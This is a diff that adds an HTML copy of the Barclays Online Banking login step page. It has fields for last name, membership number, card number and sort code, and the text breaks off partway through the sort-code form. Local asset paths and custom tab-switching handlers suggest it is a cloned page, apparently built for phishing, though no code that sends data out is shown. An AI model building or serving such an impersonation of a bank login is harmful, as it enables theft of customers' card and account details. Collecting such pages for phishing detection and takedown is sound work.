@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <style type="text/css">
+      @charset "UTF-8";
+
+      [ng\:cloak],
+      [ng-cloak],
+      [data-ng-cloak],
+      [x-ng-cloak],
+      .ng-cloak,
+      .x-ng-cloak,
+      .ng-hide {
+        display: none !important;
+      }
+
+      ng\:form {
+        display: block;
+      }
+
+      .ng-animate-block-transitions {
+        transition: 0s all !important;
+        -webkit-transition: 0s all !important;
+      }
+
+      .ng-hide-add-active,
+      .ng-hide-remove {
+        display: block !important;
+      }
+    </style>
+    <title>Step 1 - Login details - Barclays Online Banking</title>
+    <meta name="apple-itunes-app" content="app-id=536248734">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="bcsid" content="0211439ea175833bf0909687047a18fb">
+  </head>
+  <body>
+    <div>
+      <div id="bdlLogin-bootstrap" class="desktop-site ng-scope" xmlns:ng="http://angularjs.org">
+        <link rel="stylesheet" type="text/css" href="./page_two_files/rolb-theme-2-0.css">
+        <link rel="stylesheet" type="text/css" href="./page_two_files/authlogin-bdl.css">
+        <div class="rolb dss-container">
+          <!-- ngInclude:  -->
+          <ng-include src="&#39;/authlogin/partials/bdlLogin/header.html?v=1699011094955&#39;" class="ng-scope">
+            <header id="main-header" class="rolbHeader header ng-scope" ng-controller="headerCtrl">
+              <div>
+                <a aria-label="Barclays Homepage" href="https://www.barclays.co.uk/" class="logoDecoration">
+                  <span class="icon icon-barclays-eagle logo-eagle logoSpace"></span>
+                  <span class="icon icon-barclays-wordmark logo-title logoSpace logoSpaceBarclays hidden-xs"></span>
+                </a>
+              </div>
+              <!-- ngIf: showLogout -->
+              <!-- ngIf: !showLogout -->
+              <div class="header-right secureSpace ng-scope" ng-if="!showLogout">
+                <span class="icon-secure"></span>
+                <a class="normal  standalone-links" id="headerSecureLink" tabindex="" href="http://www.barclays.co.uk/security" target="_blank" analytics-tag="" title="opens in a new tab" dss-dda-component="DDA Specific Component Attribute">
+                  <span class="ng-scope">Secure</span>
+                </a>
+              </div>
+              <!-- end ngIf: !showLogout -->
+              <!-- ngIf: isModal -->
+            </header>
+          </ng-include>
+          <!-- ngView:  -->
+          <div ng-view="" class="ng-scope">
+            <main id="content" class="ng-scope">
+              <!-- ngIf: authDataUser.display -->
+              <div ng-if="authDataUser.display" show-user-info="false" class="ng-scope">
+                <!-- ngIf: authDataUser.tagline !== '' -->
+                <!-- ngIf: authDataUser.tagline === '' -->
+                <section class="jumbo jumbo-noimage jumbo-cyan5 " id="pageHero id" hero-title="Log in to Online Banking" data="authDataUser" userinfo="showUserInfo" link-click="heroLinkClick(event,link)" banner-status="false" analytics-tag="" analytics-label="" ng-if="authDataUser.tagline === &#39;&#39;">
+                  <!-- ngIf: showBackButton -->
+                  <div class="jumbo-body" ng-class="{&#39;user-panel&#39;:userinfo, &#39;notification-banner&#39;: notificationBanner}">
+                    <div class="container-fluid">
+                      <div class="row">
+                        <div class="col-md-8 col-md-offset-2">
+                          <div class="jumbo-content aperture-left">
+                            <h1 class="jumbo-title ng-binding">Log in to Online Banking</h1>
+                          </div>
+                          <!-- ngIf: htmlData && htmlData.headText -->
+                          <!-- ngIf: userinfo -->
+                        </div>
+                        <!-- ngIf: notificationBanner -->
+                      </div>
+                    </div>
+                  </div>
+                </section>
+                <!-- end ngIf: authDataUser.tagline === '' -->
+              </div>
+              <!-- end ngIf: authDataUser.display -->
+              <section class="wrapper ROLBWrapper">
+                <div class="container-fluid">
+                  <div class="row">
+                    <div class="col-md-8 col-md-offset-2">
+                      <form id="loginStep1" name="loginStep1" autocomplete="off" novalidate="" show-errors-if-any="false" class="ng-dirty ng-invalid ng-invalid-required">
+                        <!-- ngIf: serverErrorMessagesObj.headerErrors.errorLength -->
+                        <!-- ngIf: loginStep1[globalErrorFormName] !=  && loginStep1[globalErrorFormName].formSubmitted -->
+                        <!-- ngIf: loadBrowserAlert -->
+                        <div class="mb-24 ng-scope" ng-if="loadBrowserAlert">
+                          <browser-alert>
+                            <!-- ngIf: content.display -->
+                          </browser-alert>
+                        </div>
+                        <!-- end ngIf: loadBrowserAlert -->
+                        <!-- ngIf: browser.valid -->
+                        <div ng-if="browser.valid" class="ng-scope">
+                          <cookie-policy class="ng-scope">
+                            <!-- ngIf: content.display -->
+                          </cookie-policy>
+                          <header-content class="ng-scope">
+                            <div class="marginHead">
+                              <b-text id="header-change" class="head-color ng-isolate-scope" type="h2" b-data="How would you like to log in?" dss-dda-component="DDA Specific Component Attribute">
+                                <h2>How would you like to log in?</h2>
+                              </b-text>
+                            </div>
+                            <div class="marginHeadSubheader">
+                              <b-text id="headerContent" type="span" class="font16px font-family ng-isolate-scope" b-data="Not registered for Online Banking?" dss-dda-component="DDA Specific Component Attribute">
+                                <span>Not registered for Online Banking?</span>
+                              </b-text>
+                              <a class="normal " id="1hhangilr" tabindex="" href="https://bank.barclays.co.uk/olb/registration/registerAppContainer.do" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+                                <span class="ng-binding ng-scope">Register now</span>
+                              </a>
+                              <span class="dotStyle">.</span>
+                            </div>
+                          </header-content>
+                          <!-- ngIf: !mobileView -->
+                          <div ng-if="!mobileView" class="ng-scope">
+                            <div class="spaceTab theme-barclays ng-isolate-scope" id="loginTypeSelection" is-content="false" click="loginTypeChange" selected-tab="selectedTab" data="tabsLogin" analytics-tag="b-radio" analytics-label="loginType" dss-dda-component="DDA Specific Component Attribute">
+                              <div class="m-tab-nav">
+                                <div class="m-tab-nav__body has-finished-scroll">
+                                  <!-- contain tabs within tablist container -->
+                                  <ul class="m-tab-nav__items" role="tablist">
+                                    <li data-tab-active="tab_key_1" ng-repeat="value in dataTabs track by $index" class="m-tab-nav__item ng-scope" role="presentation">
+                                      <button onclick="goToMembershipPage()" id="loginTypeSelection_tab_button_0" class="a-tab ng-binding" type="button" aria-controls="tab_key_0" aria-selected="false" tabindex="-1"> Membership number </button>
+                                    </li>
+                                    <!-- end ngRepeat: value in dataTabs track by $index -->
+                                    <li data-tab-active="tab_key_1" ng-repeat="value in dataTabs track by $index" class="m-tab-nav__item ng-scope" role="presentation">
+                                      <button id="loginTypeSelection_tab_button_1" class="a-tab ng-binding is-active" type="button" aria-controls="tab_key_1" aria-selected="true" tabindex="0"> Card number </button>
+                                    </li>
+                                    <!-- end ngRepeat: value in dataTabs track by $index -->
+                                    <li data-tab-active="tab_key_1" ng-repeat="value in dataTabs track by $index" class="m-tab-nav__item ng-scope" role="presentation">
+                                      <button onclick="goToSortCodePage()" id="loginTypeSelection_tab_button_2" class="a-tab ng-binding" type="button" aria-controls="tab_key_2" aria-selected="false" tabindex="-1"> Sort code and account number </button>
+                                    </li>
+                                    <!-- end ngRepeat: value in dataTabs track by $index -->
+                                  </ul>
+                                </div>
+                                <!-- contain panels within containers with tabpanel role -->
+                                <!-- allow programmatic focus onto tab panel with tabindex -->
+                                <!-- associate with tab with aria-labelledby -->
+                                <!-- ngIf: isContent -->
+                              </div>
+                            </div>
+                            <div class="tab-body p-0">
+                              <div id="tab_key_0" class="tabcontent" role="tabpanel" aria-label="Membership number tab" style="display: none;">
+                                <!-- ngInclude:  -->
+                                <ng-include src="membershipNumberTemplate" class="ng-scope">
+                                  <ng-form id="membershipForm" name="membershipForm" autocomplete="off" novalidate="" show-errors-if-any="false" class="ng-scope ng-pristine ng-valid">
+                                    <div class="MemNoInput">
+                                      <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" dss-dda-component="DDA Specific Component Attribute">
+                                        <div class="form-item" ng-class="{&#39;has-error&#39;: (formController.showErrorsIfAny &amp;&amp; formController[&#39;surname&#39;].$invalid) ||
+       (formController[&#39;surname&#39;].$invalid &amp;&amp; formController[&#39;surname&#39;].$dirty &amp;&amp; validationErrors)}">
+                                          <label class="label">
+                                            <span for="surnameMem" id="label-surnameMem">Last name</span>
+                                            <label for="surnameMem" id="extraLabelData-surnameMem" class="visuallyhidden ng-binding" aria-hidden="true"></label>
+                                            <!-- ngIf: tooltipconfig -->
+                                          </label>
+                                          <div class="input-wrapper" ng-class="{&#39;image-at-right&#39;: showImg}">
+                                            <span class="input-prefix"></span>
+                                            <span class="input-suffix"></span>
+                                            <input ng-attr-tabindex="" aria-labelledby="label-surnameMem extraLabelData-surnameMem" aria-describedby=" input-err-1hhanvdq2" class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="surnameMem" name="surname" ng-model="model.surnameMem.value" type="text" maxlength="24" ng-blur="trimLastname(model.surnameMem.value, &#39;surnameMem&#39;)" mca-validator-extended="AppName.Module.nameValidation | this.formController.surname" autocomplete="family-name" aria-autocomplete="inline" validator-event="blur" supportglobalerror="true" aria-required="true" analytics-tag="" aria-invalid="false">
+                                            <!-- ngIf: showImg -->
+                                          </div>
+                                          <div id="input-err-1hhanvdq2" aria-hidden="true">
+                                            <p class="no-margin" aria-live="assertive">
+                                              <!-- ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                            </p>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                    <div class="membershipNumber">
+                                      <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" dss-dda-component="DDA Specific Component Attribute">
+                                        <div class="form-item" ng-class="{&#39;has-error&#39;: (formController.showErrorsIfAny &amp;&amp; formController[&#39;membership&#39;].$invalid) ||
+       (formController[&#39;membership&#39;].$invalid &amp;&amp; formController[&#39;membership&#39;].$dirty &amp;&amp; validationErrors)}">
+                                          <label class="label">
+                                            <span for="membership0" id="label-membership0">Membership number (12 digits)</span>
+                                            <label for="membership0" id="extraLabelData-membership0" class="visuallyhidden ng-binding" aria-hidden="true"></label>
+                                            <!-- ngIf: tooltipconfig -->
+                                            <span tabindex="0" ng-if="tooltipconfig" b-tooltip="" tooltipconfig="{&quot;arrowPosition&quot;:&quot;left center&quot;,&quot;boxPosition&quot;:&quot;right center&quot;,&quot;qtipContent&quot;:{&quot;text&quot;:&quot;&lt;p&gt;You will have received this number in the post when you first signed up to Online Banking&lt;/p&gt;&quot;,&quot;customAriaText&quot;:&quot;You will have received this number in the post when you first signed up to Online Banking&quot;},&quot;iconClass&quot;:&quot;icon-question&quot;,&quot;mobileConfig&quot;:{&quot;arrowPosition&quot;:&quot;bottom center&quot;,&quot;boxPosition&quot;:&quot;top center&quot;}}" id="described-membership0" class="ng-scope ng-isolate-scope icon iconSpacing dsstooltip icon-question" role="button" aria-label="You will have received this number in the post when you first signed up to Online Banking" data-hasqtip="16"></span>
+                                            <!-- end ngIf: tooltipconfig -->
+                                          </label>
+                                          <div class="input-wrapper" ng-class="{&#39;image-at-right&#39;: showImg}">
+                                            <span class="input-prefix"></span>
+                                            <span class="input-suffix"></span>
+                                            <input ng-attr-tabindex="" aria-labelledby="label-membership0 extraLabelData-membership0" aria-describedby="described-membership0  input-err-1hhanvdq4" class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="membership0" name="membership" ng-model="model.membershipNum.value" type="text" aria-label="12 digits" mca-validator-extended="AppName.Module.membershipValidation | this.formController.membership" validator-event="blur" supportglobalerror="true" maxlength="12" tooltipconfig="tooltipConfig(&#39;membership&#39;)" autocomplete="membership" aria-autocomplete="inline" aria-required="true" analytics-tag="" aria-invalid="false">
+                                            <!-- ngIf: showImg -->
+                                          </div>
+                                          <div id="input-err-1hhanvdq4" aria-hidden="true">
+                                            <p class="no-margin" aria-live="assertive">
+                                              <!-- ngRepeat: (key, value) in formController['membership'].$error -->
+                                              <!-- ngIf: ((formController['membership'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['membership'].$invalid && formController['membership'].$dirty && currentState && validationErrors)) && formController['membership'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['membership'].$error -->
+                                              <!-- ngIf: ((formController['membership'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['membership'].$invalid && formController['membership'].$dirty && currentState && validationErrors)) && formController['membership'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['membership'].$error -->
+                                              <!-- ngIf: ((formController['membership'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['membership'].$invalid && formController['membership'].$dirty && currentState && validationErrors)) && formController['membership'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['membership'].$error -->
+                                              <!-- ngIf: ((formController['membership'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['membership'].$invalid && formController['membership'].$dirty && currentState && validationErrors)) && formController['membership'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['membership'].$error -->
+                                              <!-- ngRepeat: (key, value) in formController['membership'].$error -->
+                                              <!-- ngIf: ((formController['membership'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['membership'].$invalid && formController['membership'].$dirty && !currentState && validationErrors)) && formController['membership'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['membership'].$error -->
+                                              <!-- ngIf: ((formController['membership'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['membership'].$invalid && formController['membership'].$dirty && !currentState && validationErrors)) && formController['membership'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['membership'].$error -->
+                                              <!-- ngIf: ((formController['membership'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['membership'].$invalid && formController['membership'].$dirty && !currentState && validationErrors)) && formController['membership'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['membership'].$error -->
+                                              <!-- ngIf: ((formController['membership'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['membership'].$invalid && formController['membership'].$dirty && !currentState && validationErrors)) && formController['membership'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['membership'].$error -->
+                                            </p>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                    <div class="forgotMembershipLink">
+                                      <a class="normal " id="forgotMembershipLink" tabindex="" href="javascript:void(0)" ng-click="forgotMembership()" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+                                        <span class="ng-scope">Don't know your membership number?</span>
+                                      </a>
+                                    </div>
+                                  </ng-form>
+                                </ng-include>
+                              </div>
+                              <div id="tab_key_1" class="tabcontent" role="tabpanel" aria-label="Card number tab" style="display: block;">
+                                <!-- ngInclude:  -->
+                                <ng-include src="loginCardNumberTemplate" class="ng-scope">
+                                  <ng-form id="cardNumberForm" name="cardNumberForm" autocomplete="off" novalidate="" show-errors-if-any="false" class="ng-scope ng-pristine ng-valid">
+                                    <div class="MemNoInput">
+                                      <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" dss-dda-component="DDA Specific Component Attribute">
+                                        <div class="form-item" ng-class="{&#39;has-error&#39;: (formController.showErrorsIfAny &amp;&amp; formController[&#39;surname&#39;].$invalid) ||
+       (formController[&#39;surname&#39;].$invalid &amp;&amp; formController[&#39;surname&#39;].$dirty &amp;&amp; validationErrors)}">
+                                          <label class="label">
+                                            <span for="surnameCardno" id="label-surnameCardno">Last name</span>
+                                            <label for="surnameCardno" id="extraLabelData-surnameCardno" class="visuallyhidden ng-binding" aria-hidden="true"></label>
+                                            <!-- ngIf: tooltipconfig -->
+                                          </label>
+                                          <div class="input-wrapper" ng-class="{&#39;image-at-right&#39;: showImg}">
+                                            <span class="input-prefix"></span>
+                                            <span class="input-suffix"></span>
+                                            <input ng-attr-tabindex="" aria-labelledby="label-surnameCardno extraLabelData-surnameCardno" aria-describedby=" input-err-1hhanvdq8" class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="surnameCardno" name="surname" ng-model="model.surnameCardno.value" type="text" maxlength="24" ng-blur="trimLastname(model.surnameCardno.value, &#39;surnameCardno&#39;)" autocomplete="family-name" aria-autocomplete="inline" mca-validator-extended="AppName.Module.nameValidation | this.formController.surname" validator-event="blur" supportglobalerror="true" aria-required="true" analytics-tag="">
+                                            <!-- ngIf: showImg -->
+                                          </div>
+                                          <div id="input-err-1hhanvdq8" aria-hidden="true">
+                                            <p class="no-margin" aria-live="assertive">
+                                              <!-- ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                            </p>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                    <card-number class="ng-scope">
+                                      <div id="cardNoInput" class="cardNoInput">
+                                        <div>
+                                          <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" dss-dda-component="DDA Specific Component Attribute">
+                                            <div class="form-item" ng-class="{&#39;has-error&#39;: (formController.showErrorsIfAny &amp;&amp; formController[&#39;cardNumber&#39;].$invalid) ||
+       (formController[&#39;cardNumber&#39;].$invalid &amp;&amp; formController[&#39;cardNumber&#39;].$dirty &amp;&amp; validationErrors)}">
+                                              <label class="label">
+                                                <span for="cardNumber0" id="label-cardNumber0">Card number (16 digits)</span>
+                                                <label for="cardNumber0" id="extraLabelData-cardNumber0" class="visuallyhidden ng-binding" aria-hidden="true"></label>
+                                                <!-- ngIf: tooltipconfig -->
+                                                <span tabindex="0" ng-if="tooltipconfig" b-tooltip="" tooltipconfig="{&quot;arrowPosition&quot;:&quot;left center&quot;,&quot;boxPosition&quot;:&quot;right center&quot;,&quot;qtipContent&quot;:{&quot;text&quot;:&quot;&lt;p&gt;This can be found on the front of your Barclays debit, cash or authentication card.&lt;/p&gt;&lt;p&gt;  &lt;img src=\&quot;/OLB/A/Content/Images/1321077818816-card_number_card.jpg\&quot; alt=\&quot;Card\&quot; height=\&quot;109\&quot; width=\&quot;168\&quot;&gt;&lt;/p&gt;&quot;,&quot;customAriaText&quot;:&quot;This can be found on the front of your Barclays debit, cash or authentication card.  &quot;},&quot;iconClass&quot;:&quot;icon-question&quot;,&quot;mobileConfig&quot;:{&quot;arrowPosition&quot;:&quot;bottom center&quot;,&quot;boxPosition&quot;:&quot;top center&quot;}}" id="described-cardNumber0" class="ng-scope ng-isolate-scope icon iconSpacing dsstooltip icon-question" role="button" aria-label="This can be found on the front of your Barclays debit, cash or authentication card.  " data-hasqtip="17"></span>
+                                                <!-- end ngIf: tooltipconfig -->
+                                              </label>
+                                              <div class="input-wrapper" ng-class="{&#39;image-at-right&#39;: showImg}">
+                                                <span class="input-prefix"></span>
+                                                <span class="input-suffix"></span>
+                                                <input ng-attr-tabindex="" aria-labelledby="label-cardNumber0 extraLabelData-cardNumber0" aria-describedby="described-cardNumber0  input-err-1hhanvdql" class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="cardNumber" name="cardNumber" ng-model="model.cardNumber.value" maxlength="19" ng-keypress="validateCardNumber()" ng-change="validateCardNumber()" tooltipconfig="tooltipConfig(&#39;cardno&#39;)" mca-validator-extended="AppName.Module.cardNumberValidation | this.formController.cardNumber" autocomplete="cc-number" aria-autocomplete="inline" validator-event="blur" supportglobalerror="true" aria-required="true" analytics-tag="" aria-invalid="false">
+                                                <!-- ngIf: showImg -->
+                                              </div>
+                                              <div id="input-err-1hhanvdql" aria-hidden="true">
+                                                <p class="no-margin" aria-live="assertive">
+                                                  <!-- ngRepeat: (key, value) in formController['cardNumber'].$error -->
+                                                  <!-- ngIf: ((formController['cardNumber'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['cardNumber'].$invalid && formController['cardNumber'].$dirty && currentState && validationErrors)) && formController['cardNumber'].$error[key] -->
+                                                  <!-- end ngRepeat: (key, value) in formController['cardNumber'].$error -->
+                                                  <!-- ngIf: ((formController['cardNumber'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['cardNumber'].$invalid && formController['cardNumber'].$dirty && currentState && validationErrors)) && formController['cardNumber'].$error[key] -->
+                                                  <!-- end ngRepeat: (key, value) in formController['cardNumber'].$error -->
+                                                  <!-- ngIf: ((formController['cardNumber'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['cardNumber'].$invalid && formController['cardNumber'].$dirty && currentState && validationErrors)) && formController['cardNumber'].$error[key] -->
+                                                  <!-- end ngRepeat: (key, value) in formController['cardNumber'].$error -->
+                                                  <!-- ngIf: ((formController['cardNumber'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['cardNumber'].$invalid && formController['cardNumber'].$dirty && currentState && validationErrors)) && formController['cardNumber'].$error[key] -->
+                                                  <!-- end ngRepeat: (key, value) in formController['cardNumber'].$error -->
+                                                  <!-- ngRepeat: (key, value) in formController['cardNumber'].$error -->
+                                                  <!-- ngIf: ((formController['cardNumber'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['cardNumber'].$invalid && formController['cardNumber'].$dirty && !currentState && validationErrors)) && formController['cardNumber'].$error[key] -->
+                                                  <!-- end ngRepeat: (key, value) in formController['cardNumber'].$error -->
+                                                  <!-- ngIf: ((formController['cardNumber'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['cardNumber'].$invalid && formController['cardNumber'].$dirty && !currentState && validationErrors)) && formController['cardNumber'].$error[key] -->
+                                                  <!-- end ngRepeat: (key, value) in formController['cardNumber'].$error -->
+                                                  <!-- ngIf: ((formController['cardNumber'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['cardNumber'].$invalid && formController['cardNumber'].$dirty && !currentState && validationErrors)) && formController['cardNumber'].$error[key] -->
+                                                  <!-- end ngRepeat: (key, value) in formController['cardNumber'].$error -->
+                                                  <!-- ngIf: ((formController['cardNumber'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['cardNumber'].$invalid && formController['cardNumber'].$dirty && !currentState && validationErrors)) && formController['cardNumber'].$error[key] -->
+                                                  <!-- end ngRepeat: (key, value) in formController['cardNumber'].$error -->
+                                                </p>
+                                              </div>
+                                            </div>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </card-number>
+                                  </ng-form>
+                                </ng-include>
+                              </div>
+                              <div id="tab_key_2" class="tabcontent" role="tabpanel" aria-label="Sort code and account number tab" style="display: none;">
+                                <!-- ngInclude:  -->
+                                <ng-include src="sortCodeAndAccNumberTemplate" class="ng-scope">
+                                  <ng-form id="sortcodeForm" name="sortcodeForm" autocomplete="off" novalidate="" show-errors-if-any="false" class="ng-scope ng-pristine ng-invalid ng-invalid-required">
+                                    <div class="MemNoInput">
+                                      <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" dss-dda-component="DDA Specific Component Attribute">
+                                        <div class="form-item" ng-class="{&#39;has-error&#39;: (formController.showErrorsIfAny &amp;&amp; formController[&#39;surname&#39;].$invalid) ||
+       (formController[&#39;surname&#39;].$invalid &amp;&amp; formController[&#39;surname&#39;].$dirty &amp;&amp; validationErrors)}">
+                                          <label class="label">
+                                            <span for="surnameSortcode" id="label-surnameSortcode">Last name</span>
+                                            <label for="surnameSortcode" id="extraLabelData-surnameSortcode" class="visuallyhidden ng-binding" aria-hidden="true"></label>
+                                            <!-- ngIf: tooltipconfig -->
+                                          </label>
+                                          <div class="input-wrapper" ng-class="{&#39;image-at-right&#39;: showImg}">
+                                            <span class="input-prefix"></span>
+                                            <span class="input-suffix"></span>
+                                            <input ng-attr-tabindex="" aria-labelledby="label-surnameSortcode extraLabelData-surnameSortcode" aria-describedby=" input-err-1hhanvdqb" class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2 ng-valid-i-n-p3" id="surnameSortcode" name="surname" ng-model="model.surnameSortcode.value" type="text" maxlength="24" ng-blur="trimLastname(model.surnameSortcode.value, &#39;surnameSortcode&#39;)" autocomplete="family-name" aria-autocomplete="inline" mca-validator-extended="AppName.Module.nameValidation | this.formController.surname" validator-event="blur" supportglobalerror="true" aria-required="true" analytics-tag="">
+                                            <!-- ngIf: showImg -->
+                                          </div>
+                                          <div id="input-err-1hhanvdqb" aria-hidden="true">
+                                            <p class="no-margin" aria-live="assertive">
+                                              <!-- ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['surname'].$invalid && formController['surname'].$dirty && currentState && validationErrors)) && formController['surname'].$error[key] -->
